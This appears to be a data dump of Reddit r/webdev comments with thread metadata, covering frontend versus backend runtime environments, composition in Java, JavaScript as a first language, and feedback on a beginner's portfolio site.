11704877,0,t3_66zqpf,gt I can make simple clean static webpages in HTML and CSS using the Bootstrap framework.So in other words you can copy paste from the docs?gt Im also confident in my logic skills after the CS courses Ive taken in college Im in a CS program so theres that as well.Whatever logic you learned doesnt apply entirely to frontend as its a different paradigm regular programming.With native coding CC you code for a single environment that is installed on your endusers machine e.g. Java runtime or you compile to a binary with the runtime inside it and ship it as a single package in other words you have a degree if not complete control over execution.With backend coding you have a server stack which is its own environment  has its own runtimes these are consistent and you hopefully  using a VPS not shared hosting have complete control over. Note ill save you a bit of time the reason servers exist in web architecture is because it was inherently stateless when the protocols were conceived no way to determine between one user and another but i digress to the main point...With front end coding you have no control of the runtime environment or how the code is parsedexecuted once it reaches the endusers machine i.e. no way to even determine if it is firefox chrome or even something terminal based wget  curl... well useragent but thats unreliable. Yet it is still expected that frontend devs provide a consistent user experience.Yes you make assumptions that it is a browser and yes there is a body of standards WC and browsers must have certain features that conform to those standards however vendors google mozilla etc are free to implement those features however they wish cough Internet Explorer which as you can imagine leads to consistencyperformance issues headaches the death of motivation etc.Furthermore it gets especially fun when new features are in draft and vendors decide to get a little over ambitious and try and implement features early thus the browser prefix was born which certainly didnt help from a crossbrowser compatibility standpoint nor from a performance standpoint.gt Any and all help and advice will be greatly appreciated!Code for the most recent browsers and dont worry too much about backwards compatibility at this point. As such stay away from CSS floats focus on flexbox for your layout.,webdev,dgmro76,2,t5_2qs0q

11728135,0,t1_dgpaoce,I really enjoyed that video his examples made a lot of sense. I wish he showed a composition example with a statically typed language though  because I dont have a strong grasp on it. I envision composition in  say Java  to be a class whose properties are the composed objects. So a MurderRobotDog would have  properties killer driver and barker. Then for every single method a MurderRobotDog has you would have to define it in the class and call the same method on the corresponding property. This is assuming the properties are private. It feels too verbose.I guess you could have the properties as public but Ive been taught to always use private variables with getters.,webdev,dgpextv,1,t5_2qs0q

Granted I didnt read the article but if your taught JavaScript as your foundation of programming your going to have a hard time when it comes to strictly typed languages and interfaces. JavaScript is great for the web...  You have guys have a nail gun and think you can just go nail gunning everything together.  A good example is electron  applications. They work good for a while and randomly they are consuming  of your cpu.  Also Im not saying JavaScript should not be taught it should be but it should be in addition to .

11763280,0,t3_67usmv,Hey there! Youre off to a great start. There are a couple of things that stand out to me. There are many spelling and grammar errors on your website. I would recommend proofreading aloud in order to identify them easily. No one is going to take you seriously if you have poor grammarspelling on your portfolio page. This might just be personal preference but I would try to get your links in the top right hand corner to stick when you scroll. It just seems like thats something you would expect to happen!. The thats me portion of your site seems a little misplaced. I expected a small bio or something but instead its just the end of your site. Maybe try moving that above your introduction and making it a little more personal?EDIT I looked at the sites you built. The presidential candidate thing is really cool but did you build all of that from scratch? Looking at those I also realized that English isnt your first language it seems. I would try to find a native English speaker to proofread your site if your audiences primary language will be English.Also where is the code for these examples? Live sites are awesome but I want to look at the code too! ,webdev,dgteaz9,2,t5_2qs0q
